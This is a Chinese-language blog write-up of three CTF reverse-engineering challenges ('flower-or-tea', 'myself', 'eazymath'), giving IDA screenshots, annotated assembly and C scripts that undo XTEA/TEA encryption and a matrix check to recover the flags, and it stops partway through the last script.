        <content type="html"><![CDATA[<h1 id="reverse">Reverse</h1><h2 id="flower-or-tea">flower-or-tea</h2><p>题如其名,打开是32位C程序,发现有简单的花指令,把E8或E9都patch90即可,生成正确的代码.</p><p>在main中分析如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231207013412091.png" alt="image-20231207013412091" style="zoom:50%;" /><p>进入sub_4010C3看看:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231207013447749.png" alt="image-20231207013447749" style="zoom:50%;" /><p>main的代码有点抽象,不过sub里是一个XTEA,这个好说.</p><p>简单来说就是将flag分成2半,重新组合顺序,然后进行XTEA.很久之后写WP有点忘记了,其实逻辑不难,就是IDA逆出来的代码抽象.</p><p>C语言写的解密脚本(图省事懒得提取数据):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_4010C3</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> loop_cnt, <span class="type">unsigned</span> <span class="type">int</span> *a2, <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    v1 = *a2;                                     <span class="comment">// reversed</span></span><br><span class="line">    v0 = a2[<span class="number">1</span>];                                   <span class="comment">// wtf?</span></span><br><span class="line">    sum = <span class="number">0x31415927</span> * loop_cnt;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loop_cnt; ++i) &#123;</span><br><span class="line">        sum -= <span class="number">0x31415927</span>;</span><br><span class="line">        v1 -= (key[sum &amp; <span class="number">3</span>] + sum) ^ (v0 + ((v0 &gt;&gt; <span class="number">5</span>) ^ (v0 &lt;&lt; <span class="number">4</span>)));</span><br><span class="line">        v0 -= sum ^ (key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^</span><br><span class="line">              (v1 + ((v1 &gt;&gt; <span class="number">5</span>) ^ (v1 &lt;&lt; <span class="number">4</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    *a2 = v1;</span><br><span class="line">    result = <span class="number">4</span>;</span><br><span class="line">    a2[<span class="number">1</span>] = v0;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v4[<span class="number">100</span>];</span><br><span class="line">    v4[<span class="number">0</span>] = <span class="number">-1694939573</span>;</span><br><span class="line">    v4[<span class="number">1</span>] = <span class="number">-1005078370</span>;</span><br><span class="line">    v4[<span class="number">2</span>] = <span class="number">-1307072749</span>;</span><br><span class="line">    v4[<span class="number">3</span>] = <span class="number">-918836760</span>;</span><br><span class="line">    v4[<span class="number">4</span>] = <span class="number">-1795955634</span>;</span><br><span class="line">    v4[<span class="number">5</span>] = <span class="number">-1244910923</span>;</span><br><span class="line">    v4[<span class="number">6</span>] = <span class="number">1146217516</span>;</span><br><span class="line">    v4[<span class="number">7</span>] = <span class="number">2055874714</span>;</span><br><span class="line">    v4[<span class="number">8</span>] = <span class="number">1405669384</span>;</span><br><span class="line">    v4[<span class="number">9</span>] = <span class="number">1846639433</span>;</span><br><span class="line">    v4[<span class="number">10</span>] = <span class="number">-1677731948</span>;</span><br><span class="line">    v4[<span class="number">11</span>] = <span class="number">1593781753</span>;</span><br><span class="line">    v4[<span class="number">12</span>] = <span class="number">401024305</span>;</span><br><span class="line">    v4[<span class="number">13</span>] = <span class="number">-541222535</span>;</span><br><span class="line">    v4[<span class="number">14</span>] = <span class="number">-1886971078</span>;</span><br><span class="line">    v4[<span class="number">15</span>] = <span class="number">1944634796</span>;</span><br><span class="line">    v4[<span class="number">16</span>] = <span class="number">-1299812186</span>;</span><br><span class="line">    v4[<span class="number">17</span>] = <span class="number">1526113129</span>;</span><br><span class="line">    v4[<span class="number">18</span>] = <span class="number">754440740</span>;</span><br><span class="line">    v4[<span class="number">19</span>] = <span class="number">880502447</span>;</span><br><span class="line">    v4[<span class="number">20</span>] = <span class="number">-1178055328</span>;</span><br><span class="line">    v4[<span class="number">21</span>] = <span class="number">-1860267729</span>;</span><br><span class="line">    v4[<span class="number">22</span>] = <span class="number">-1118163045</span>;</span><br><span class="line">    v4[<span class="number">23</span>] = <span class="number">-879332550</span>;</span><br><span class="line">    v4[<span class="number">24</span>] = <span class="number">-979801922</span>;</span><br><span class="line">    v4[<span class="number">25</span>] = <span class="number">-1610607639</span>;</span><br><span class="line">    v4[<span class="number">26</span>] = <span class="number">-1053864284</span>;</span><br><span class="line">    v4[<span class="number">27</span>] = <span class="number">-561628656</span>;</span><br><span class="line">    v4[<span class="number">28</span>] = <span class="number">-1597713004</span>;</span><br><span class="line">    v4[<span class="number">29</span>] = <span class="number">1132501052</span>;</span><br><span class="line">    v4[<span class="number">30</span>] = <span class="number">2117039688</span>;</span><br><span class="line">    v4[<span class="number">31</span>] = <span class="number">-447882103</span>;</span><br><span class="line">    v4[<span class="number">32</span>] = <span class="number">1059563152</span>;</span><br><span class="line">    v4[<span class="number">33</span>] = <span class="number">-1249037927</span>;</span><br><span class="line">    v4[<span class="number">34</span>] = <span class="number">1615521047</span>;</span><br><span class="line">    v4[<span class="number">35</span>] = <span class="number">-1668269692</span>;</span><br><span class="line">    v4[<span class="number">36</span>] = <span class="number">-186628991</span>;</span><br><span class="line">    v4[<span class="number">37</span>] = <span class="number">1022684671</span>;</span><br><span class="line">    v4[<span class="number">38</span>] = <span class="number">0</span>;</span><br><span class="line">    v4[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">            <span class="number">32</span>, <span class="number">27</span>, <span class="number">39</span>, <span class="number">44</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注:题目程序中有花指令,逐个nop掉后分析程序,备注在IDA数据库中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span> / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">        sub_4010C3(<span class="number">54</span>, &amp;v4[<span class="number">2</span> * i], (<span class="type">uint32_t</span> *) key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span> / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">        flag[i] = v4[<span class="number">2</span> * i];</span><br><span class="line">        flag[<span class="number">38</span> - <span class="number">1</span> - i] = v4[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结束…</p><h2 id="myself">myself</h2><p>这个题回头一看怎么是看汇编做的…</p><p>分析main,发现有一个SMC:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231207014504668.png" alt="image-20231207014504668" style="zoom:50%;" /><p>patch掉后如下,不知道为啥函数出不来:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231207014630225.png" alt="image-20231207014630225" style="zoom:50%;" /><p>这里把汇编和分析时加的注释放上来(比较宽可以复制到编辑器中查看):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">.text:001913B0     ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:001913B0</span><br><span class="line">.text:001913B0</span><br><span class="line">.text:001913B0     sub_1913B0      proc near               ; CODE XREF: _main+8C↓p</span><br><span class="line">.text:001913B0                                             ; DATA XREF: sub_191010+1C7↑o ...</span><br><span class="line">.text:001913B0 000                 push    ebp</span><br><span class="line">.text:001913B0     sub_1913B0      endp ; sp-analysis failed</span><br><span class="line">.text:001913B0</span><br><span class="line">.text:001913B1                     mov     ebp, esp</span><br><span class="line">.text:001913B3                     sub     esp, 0Ch</span><br><span class="line">.text:001913B6                     push    ebx</span><br><span class="line">.text:001913B7                     push    esi</span><br><span class="line">.text:001913B8                     xor     ebx, ebx        ; ebx is (i) in for(int i=0;i&lt;8;++i) ???</span><br><span class="line">.text:001913BA                     push    edi</span><br><span class="line">.text:001913BB                     mov     [ebp-4], ebx    ; v0=0</span><br><span class="line">.text:001913BE                     xchg    ax, ax</span><br><span class="line">.text:001913C0</span><br><span class="line">.text:001913C0     loc_1913C0:                             ; CODE XREF: .text:00191433↓j</span><br><span class="line">.text:001913C0                     mov     ecx, [ebp+8]    ; ecx = str</span><br><span class="line">.text:001913C3                     xor     edi, edi        ; edi = 0</span><br><span class="line">.text:001913C5                     mov     esi, [ecx+ebx*4] ; esi = ((int *)str)[ebx]</span><br><span class="line">.text:001913C5                                             ; esi == v[0]</span><br><span class="line">.text:001913C8                     lea     eax, [ecx+ebx*4] ; eax = &amp;((int *)str)[ebx]</span><br><span class="line">.text:001913CB                     lea     ebx, [ebx+1]    ; ebx++</span><br><span class="line">.text:001913CE                     mov     [ebp-8], eax    ; v1 = eax // addr[0]</span><br><span class="line">.text:001913D1                     lea     eax, [ecx+ebx*4] ; eax = &amp;((int*)str)[ebx]</span><br><span class="line">.text:001913D1                                             ; eax --&gt; v[1]</span><br><span class="line">.text:001913D4                     mov     [ebp-12], eax   ; v2 = eax // addr[1]</span><br><span class="line">.text:001913D7                     lea     ebx, [edi+20h]  ; ebx = edi + 0x20 == 0x20 ???</span><br><span class="line">.text:001913DA                     mov     eax, [eax]      ; eax = *eax</span><br><span class="line">.text:001913DC                     nop     dword ptr [eax+00h]</span><br><span class="line">.text:001913E0</span><br><span class="line">.text:001913E0     loc_1913E0:                             ; CODE XREF: .text:0019141B↓j</span><br><span class="line">.text:001913E0                     mov     ecx, eax        ; TEA加密??? 这是内层循环</span><br><span class="line">.text:001913E2                     lea     edi, [edi-61C88647h] ; -=delta值,相当于+=默认的delta</span><br><span class="line">.text:001913E8                     shl     ecx, 4</span><br><span class="line">.text:001913EB                     lea     edx, [edi+eax]</span><br><span class="line">.text:001913EE                     add     ecx, 2</span><br><span class="line">.text:001913F1                     xor     edx, ecx        ; till now:</span><br><span class="line">.text:001913F1                                             ; edx = (sum+v[1])^((v[0]&lt;&lt;4)+2);</span><br><span class="line">.text:001913F3                     mov     ecx, eax</span><br><span class="line">.text:001913F5                     shr     ecx, 5</span><br><span class="line">.text:001913F8                     add     ecx, 2</span><br><span class="line">.text:001913FB                     xor     edx, ecx</span><br><span class="line">.text:001913FD                     add     esi, edx        ; before: esi == v[0]  ???</span><br><span class="line">.text:001913FD                                             ; till now:</span><br><span class="line">.text:001913FD                                             ; v[0] += (sum+v[1])^((v[1]&lt;&lt;4)+2)^(v[1] &lt;&lt; 5) + 2</span><br><span class="line">.text:001913FD                                             ; v[0] &lt;=&gt; esi</span><br><span class="line">.text:001913FF                     mov     ecx, esi        ; ecx = v[0] // v[0] has changed</span><br><span class="line">.text:00191401                     shl     ecx, 4</span><br><span class="line">.text:00191404                     add     ecx, 3</span><br><span class="line">.text:00191407                     lea     edx, [edi+esi]  ; edx = sum + v[0]</span><br><span class="line">.text:0019140A                     xor     edx, ecx</span><br><span class="line">.text:0019140C                     mov     ecx, esi</span><br><span class="line">.text:0019140E                     shr     ecx, 5</span><br><span class="line">.text:00191411                     add     ecx, 4</span><br><span class="line">.text:00191414                     xor     edx, ecx</span><br><span class="line">.text:00191416                     add     eax, edx</span><br><span class="line">.text:00191418                     sub     ebx, 1</span><br><span class="line">.text:0019141B                     jnz     short loc_1913E0</span><br><span class="line">.text:0019141D                     mov     ecx, [ebp-8]</span><br><span class="line">.text:00191420                     mov     ebx, [ebp-4]    ; v0中保存了外层循环的循环变量ebx,类似于压栈</span><br><span class="line">.text:00191423                     add     ebx, 2</span><br><span class="line">.text:00191426                     mov     [ebp-4], ebx</span><br><span class="line">.text:00191429                     mov     [ecx], esi</span><br><span class="line">.text:0019142B                     mov     ecx, [ebp-0Ch]</span><br><span class="line">.text:0019142E                     mov     [ecx], eax</span><br><span class="line">.text:00191430                     cmp     ebx, 8</span><br><span class="line">.text:00191433                     jl      short loc_1913C0</span><br><span class="line">.text:00191435                     pop     edi</span><br><span class="line">.text:00191436                     pop     esi</span><br><span class="line">.text:00191437                     pop     ebx</span><br><span class="line">.text:00191438                     mov     esp, ebp</span><br><span class="line">.text:0019143A                     pop     ebp</span><br><span class="line">.text:0019143B                     retn</span><br><span class="line">.text:0019143B     ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>第一次分析汇编(被迫的),累死了…</p><p>分析的结果如下(人肉反编译QWQ):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 没错,这段汇编对应的函数就是一个TEA加密...</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TEA_encrypt</span><span class="params">(<span class="type">uint32_t</span> *v)</span> &#123;</span><br><span class="line">    <span class="comment">// uint32_t key[4]=&#123;2,2,3,4&#125;;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// uint32_t v0 = v[0], v1 = v[1];</span></span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">0</span>, delta = <span class="number">0x61C88647</span>;</span><br><span class="line">    <span class="type">uint32_t</span> ecx = v[<span class="number">0</span>], edx;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            ecx = (v[1] &lt;&lt; 4) + 2;</span></span><br><span class="line"><span class="comment">            edx = sum + v[1];</span></span><br><span class="line"><span class="comment">            edx ^= ecx;</span></span><br><span class="line"><span class="comment">            // edx = (sum+v[1])^((v[0]&lt;&lt;4)+2);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            ecx = v[1];</span></span><br><span class="line"><span class="comment">            ecx = (ecx &lt;&lt; 5) + 2;</span></span><br><span class="line"><span class="comment">            edx ^= ecx;</span></span><br><span class="line"><span class="comment">            // edx ^= ecx</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            v[0] += edx;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="comment">// 标准TEA加密</span></span><br><span class="line">        v[<span class="number">0</span>] += (sum + v[<span class="number">1</span>]) ^ ((v[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) + <span class="number">2</span>) ^ ((v[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>) + <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) + <span class="number">3</span>) ^ (sum + v[<span class="number">0</span>]) ^ ((v[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// v[0] = v0;</span></span><br><span class="line">    <span class="comment">// v[1] = v1;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那就TEA解密呗…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">32</span>;</span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 两个32位无符号整数，即待加密的64bit明文数据</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v[] = &#123;</span><br><span class="line">            <span class="number">240</span>, <span class="number">249</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">196</span>, <span class="number">148</span>, <span class="number">97</span>, <span class="number">226</span>, <span class="number">37</span>, <span class="number">145</span>,</span><br><span class="line">            <span class="number">121</span>, <span class="number">128</span>, <span class="number">25</span>, <span class="number">194</span>, <span class="number">15</span>, <span class="number">31</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">235</span>,</span><br><span class="line">            <span class="number">197</span>, <span class="number">114</span>, <span class="number">245</span>, <span class="number">132</span>, <span class="number">133</span>, <span class="number">58</span>, <span class="number">204</span>, <span class="number">64</span>, <span class="number">187</span>, <span class="number">42</span>,</span><br><span class="line">            <span class="number">163</span>, <span class="number">210</span>, <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 四个32位无符号整数，即128bit的key</span></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> *p = (<span class="type">uint32_t</span> *) v;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        decrypt(p, k);</span><br><span class="line">        p += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="type">char</span>*)v);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结束…</p><h2 id="eazymath">eazymath</h2><p>很久前做的,忘记了,反正看了半天记得就是一个矩阵求逆…</p><p>然后有一个字符table的映射,这里记得好像存在多解?所以写的爆破(其实应该是我懒得逆逻辑…)</p><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// IDA备注</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      v8 = __readfsqword(0x28u);</span></span><br><span class="line"><span class="comment">  puts(&quot;welcome_to_math&quot;);</span></span><br><span class="line"><span class="comment">  __isoc99_scanf(&quot;%s&quot;, flag);</span></span><br><span class="line"><span class="comment">  check((__int64)flag, (__int64)table);         // char in flag must in table</span></span><br><span class="line"><span class="comment">  checkposition(flag, table, (__int64)position);// convert to [index of table]</span></span><br><span class="line"><span class="comment">  exchange(position, (__int64)&amp;number);         // pos[i] = number[pos[i]]</span></span><br><span class="line"><span class="comment">  a2o(position, (__int64)last);                 // uint8_t index value to uint32_t value</span></span><br><span class="line"><span class="comment">                                                //</span></span><br><span class="line"><span class="comment">                                                //</span></span><br><span class="line"><span class="comment">  for ( i = 0; i &lt;= 4; ++i )</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    for ( j = 0; j &lt;= 4; ++j )</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      v7[5 * i + j] = 0;</span></span><br><span class="line"><span class="comment">      for ( k = 0; k &lt;= 4; ++k )</span></span><br><span class="line"><span class="comment">        v7[5 * i + j] = ((unsigned __int8)v7[5 * i + j]</span></span><br><span class="line"><span class="comment">                       + (unsigned __int8)last[5 * i + k] * (unsigned __int8)matrix[5 * k + j]) &amp; 0x1F;</span></span><br><span class="line"><span class="comment">      if ( i == j &amp;&amp; v7[5 * i + j] != 1 )</span></span><br><span class="line"><span class="comment">        exit(0);</span></span><br><span class="line"><span class="comment">      if ( i != j &amp;&amp; v7[5 * i + j] )</span></span><br><span class="line"><span class="comment">        exit(0);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  